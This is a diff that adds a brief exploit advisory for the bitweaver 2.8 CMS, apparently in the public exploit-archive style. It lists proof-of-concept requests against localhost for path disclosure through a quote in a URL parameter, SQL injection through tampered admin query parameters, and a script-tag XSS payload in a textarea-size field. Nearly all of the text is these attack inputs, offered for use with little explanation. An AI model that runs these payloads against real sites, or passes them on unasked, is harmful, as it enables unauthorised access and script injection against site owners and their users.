@@ -1,0 +1,33 @@
+# exploit title: Path Disclosure bitweaver 2.8
+# date: 25.o2.2o11
+# author: lemlajt
+# software : bitweaver
+# version: 2.8
+# tested on: linux
+# cve :
+#
+
+Path Disclosure bitweaver 2.8
+PoC :
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/kernel/admin/index.php?page=%27
+
+sql injection in bitweaver 2.8
+PoC :
+1. Goto:
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/quicktags/admin/admin_quicktags.php?format_guid=tikiwiki&sort_mode=tagpos_asc
+
+2. Data Tamper:
+$find = ' sql
+$sort_mode =
+$format_guid =
+$list_page =
+
+
+bonus: xss
+POST
+http://localhost/www/cmsadmins/bitweaver2.8.1/bitweaver/kernel/admin/index.php
+?
+$liberty_textarea_height = "><...>
+$liberty_textarea_width = "><script>here</script>
+
+# *
